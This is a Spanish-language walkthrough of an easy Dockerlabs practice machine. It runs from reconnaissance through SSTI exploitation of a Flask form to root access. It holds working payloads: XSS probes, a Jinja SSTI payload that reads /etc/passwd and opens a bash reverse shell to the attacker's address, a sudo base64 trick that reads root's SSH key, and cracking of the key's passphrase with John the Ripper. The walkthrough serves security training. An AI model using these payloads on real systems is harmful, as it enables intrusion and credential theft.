
DIFICULTAD: EASY

ENLACE:  [Dockerlabs](https://dockerlabs.es/)

![image](https://github.com/danielhidalgo2/images/assets/60622651/3039d877-0847-4e3b-9b2c-f334c2aebbed)
## RECONOCIMIENTO


Ya desplegada la máquina y después de comprobar que tenemos conectividad a ella le vamos a tirar el típico escaneo con nmap:

```shell-session
sudo nmap -p- --open -sS -sCV --min-rate 5000 -Pn -n 172.17.0.2 -vvv
```

Esto nos reportará lo siguiente:

```shell-session
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 dc:98:72:d5:05:7e:7a:c0:14:df:29:a1:0e:3d:05:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKZZ30gHh3MJnOlBFsClzY4+XLHLM3yZHnYGk0bNxNPPQtaojCxlQAjpM4uWPkVKLWDJQ53wQ/HIeaaqsE7n8Fs=
|   256 39:42:28:c9:c8:fa:05:de:89:e6:37:62:4d:8b:f3:63 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHgwRMztrUMxAvJeiwbmls3FFWnEj11lPMbqFIDUorc2
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
8089/tcp open  unknown syn-ack ttl 64
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Thu, 23 May 2024 12:31:39 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 537
|     Connection: close
|     <html><head><title>Dale duro bro</title><style>body {margin: 90px; background-image: url('/static/1366_2000.jpg');}</style></head><body>
|     <h1>Nada interesante que buscar</h1>
|     <form>
|     <input name="user" style="border: 2px solid #0000FF; padding: 10px; border-radius: 10px; margin-bottom: 25px;" value="Hola"><br>
|     <input type="submit" value="No hay nada enserio, no toques" style="border: 0px; padding: 5px 20px ; color: #0000FF;">
|     </form>
|     <br><p style="margin-top: 30px;">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Thu, 23 May 2024 12:31:39 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8089-TCP:V=7.94SVN%I=7%D=5/23%Time=664F372B%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,2C7,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Thu,\x2023\x20May\x202024\x2012:31:39\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20537\r\nConnection:\x20close\r\n\r\n\n\x20\x20\x20\x20<html><head><t
SF:itle>Dale\x20duro\x20bro</title><style>body\x20{margin:\x2090px;\x20bac
SF:kground-image:\x20url\('/static/1366_2000\.jpg'\);}</style></head><body
SF:>\n\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Nada\x20intere
SF:sante\x20que\x20buscar</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<form>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<input\x20name=\"user\"\x20style=\"border
SF::\x202px\x20solid\x20#0000FF;\x20padding:\x2010px;\x20border-radius:\x2
SF:010px;\x20margin-bottom:\x2025px;\"\x20value=\"Hola\"><br>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<input\x20type=\"submit\"\x20value=\"No\x20hay\x20
SF:nada\x20enserio,\x20no\x20toques\"\x20style=\"border:\x200px;\x20paddin
SF:g:\x205px\x2020px\x20;\x20color:\x20#0000FF;\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20</form>\n\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20<b
SF:r><p\x20style=\"margin-top:\x2030px;\">\n\x20\x20\x20\x20")%r(HTTPOptio
SF:ns,C7,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20Python/
SF:3\.11\.2\r\nDate:\x20Thu,\x2023\x20May\x202024\x2012:31:39\x20GMT\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS
SF:,\x20HEAD\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(R
SF:TSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20
SF:\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x2
SF:0\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>E
SF:rror\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x
SF:20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20r
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Como vemos, tenemos el puerto 22 con servicio SSH abierto, el 80 HTTP y el 8089.
Si echamos un vistazo a la web por el puerto 80 no encontramos nada interesante ya que es la página por default de Apache2 y fuzzeando directorios más de lo mismo.

## RECONOCIMIENTO A LA WEB POR EL PUERTO 8089


Sin embargo parece que la web por el servicio 8089 es mucho más interesante.

![image](https://github.com/danielhidalgo2/images/assets/60622651/d00d021e-f887-4c21-ac98-d2416edcf2f4)

## EXPLOTACION
## XSS


Probamos a ver si interpreta html el formulario de la siguiente manera:

```shell-session
<h1>HOOOLA</h1>
```

![image](https://github.com/danielhidalgo2/images/assets/60622651/97f25004-208e-4863-9299-3ec369821d52)


También probamos si es susceptible a XSS con el típico payload:

```
<script>alert("XSSED")</script>
```


![image](https://github.com/danielhidalgo2/images/assets/60622651/4a6ace3e-779c-4cd2-af4d-413793c8e834)

O algún que otro payload más visual:

```
<script>document.body.style.background = "#FFC0CB"</script>
```


![image](https://github.com/danielhidalgo2/images/assets/60622651/dc381aaf-60b2-452d-bda0-e58ccb51b5a2)

## SSTI

Por último comprobamos si es vulnerable a la inyección de plantillas en el lado del servidor o SSTI esto lo podemos comprobar de la siguiente manera:

```
{{2*2}}
```

Si nos devuelve el resultado de la multiplicación es posible que podamos explotar un SSTI.

![image](https://github.com/danielhidalgo2/images/assets/60622651/d455025f-8fdf-41f6-8d16-3c65466c4fe0)

Otra forma de comprobarlo es tratar de escribirle operaciones imposibles como puede ser una división entre 0. Esto nos debería devolver un error.

```
{{2/0}}
```


![image](https://github.com/danielhidalgo2/images/assets/60622651/8932150a-0b6e-4716-b229-dabaabc51553)

Tratamos de enumerar directorios interesantes como puede ser /etc/passwd con el siguiente script:

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}
```

Analizando el código fuente:

![image](https://github.com/danielhidalgo2/images/assets/60622651/0632905a-33f6-42e9-94ca-efad809b2326)

Como comprobamos el payload funciona perfectamente mostrándonos posibles usuarios. 
Aprovechamos el mismo payload para tratar de entablarnos el típico one-liner para una reverse shell.

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'').read()}}
```


![image](https://github.com/danielhidalgo2/images/assets/60622651/8d0be610-f815-4e59-b575-986ed33f2a4c)

Poniéndonos en escucha con netcat obtenemos nuestra reverse shell :D 

## ESCALADA DE PRIVILEGIOS

Probamos sudo -l para ver si podemos algún binario como root y en efecto hay un binario de base64

![image](https://github.com/danielhidalgo2/images/assets/60622651/08760537-88b0-436d-9857-2df0a141d026)

Tras una breve búsqueda en  [GTFOBins](https://gtfobins.github.io/) vemos como podemos aprovecharnos de este binario:

```
sudo base64 /root/.ssh/id_rsa | base64 --decode
```

Si recordamos el puerto 22 estaba abierto, entonces tratamos de leer el id_rsa de root para poder loggearnos.

![image](https://github.com/danielhidalgo2/images/assets/60622651/adcaf2dc-4b87-4520-9a65-a982ce62af56)

Nos copiamos este id_rsa en nuestra máquina atacante, y con ssh2john sacamos el hash de esta clave.

```
ssh2john id_rsa > hash
```

Por último con John The Ripper y el clásico rockyou crackeamos el passphrase de la clave.

```
john hash --wordlist=/usr/share/wordlist/rockyou.txt
```

Nos mostrará lo siguiente:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
honda1           (id_rsa)     
1g 0:00:01:23 DONE (2024-05-23 15:15) 0.01197g/s 42.52p/s 42.52c/s 42.52C/s cougar..01234
Use the "--show" option 
```


![image](https://github.com/danielhidalgo2/images/assets/60622651/59870859-c1e3-4e07-b365-38d4e8339072)

Por último le damos los permisos necesarios a id_rsa y con ssh deberíamos conectarnos como root...

![image](https://github.com/danielhidalgo2/images/assets/60622651/4fd78886-1603-4085-8796-697082826fff)